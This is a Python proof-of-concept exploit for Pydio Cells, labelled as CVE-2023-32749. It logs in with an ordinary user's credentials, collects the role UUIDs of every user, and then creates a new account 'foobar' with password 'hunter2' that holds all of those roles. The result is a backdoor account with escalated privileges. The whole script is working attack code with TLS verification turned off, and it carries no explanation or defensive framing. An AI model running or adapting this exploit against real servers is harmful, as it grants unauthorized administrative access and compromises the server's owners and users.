import requests
import json
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse

# Suppress InsecureRequestWarning
warnings.filterwarnings('ignore', category=InsecureRequestWarning)

def get_jwt_token(url, username, password):
    auth_body = json.dumps({
        "AuthInfo":{
                "login":username,
                "password":password,
                "type":"credentials"
                }
        })
    headers = {
        "Content-Type": "application/json"
    }
    res = requests.post(f'{url}/a/frontend/session',headers=headers,data=auth_body,verify=False)
    if res.status_code == 200:
        res_json = res.json()
        jwt_token = res_json.get('JWT','')
        token = (res_json.get('Token')).get('AccessToken')
        print(f"[*] Got the JWT token {token}")
        return jwt_token
    else:
        print(f"[-] Failed with status code {res.status_code} with the following error - \n {res.text}")
        return 1
    
def get_all_users_req(url, jwt_token):
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Content-Type": "application/json"
    }
    data = json.dumps({})
    res = requests.post(f'{url}/a/user', data=data,headers=headers, verify=False)
    if res.status_code == 200:
        data = res.json()
        uuids = [user['Uuid'] for user in data['Users'] if 'Roles' in user]
        unique_uuids = list(set(uuids))
        print("[*] Got uuids for the new user")
        return json.dumps(unique_uuids)
    else:
        print(f"Failed with status code {res.status_code} and response: {res.text}")
        return 1
def create_user(url, jwt_token,uuid):

    json_uuid = json.loads(uuid)
    data = json.dumps({
    "Login": "foobar",
    "Password": "hunter2",
    "Attributes": {"profile": "shared"},
    "Roles": [{"Uuid": uuid} for uuid in json_uuid]
    })
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Content-Type": "application/json"
    }
    res = requests.put(f'{url}/a/user/foobar',data=data,headers=headers,verify=False)
    if res.status_code == 200:
        print("[*] Created new user: foobar with password: hunter2")
        print(res.text)
        return 0
    else:
        print(f"[-] Failed to create new users with uuids \n {res.text}")
        return 1
    
        
def main():

    parser = argparse.ArgumentParser(description='PoC for PyDio Cells - CVE-2023-32749')
    parser.add_argument('-u','--user',type=str,required=True)
    parser.add_argument('-p','--password',type=str,required=True)
    parser.add_argument('-l','--url',type=str,required=True)

    args = parser.parse_args()

    username = args.user
    password = args.password
    url = args.url


    jwt_token =  get_jwt_token(url,username,password)
    if jwt_token:
        uuid = get_all_users_req(url,jwt_token)
        if uuid:
            create_user(url,jwt_token,uuid)

if __name__ == '__main__':
    main()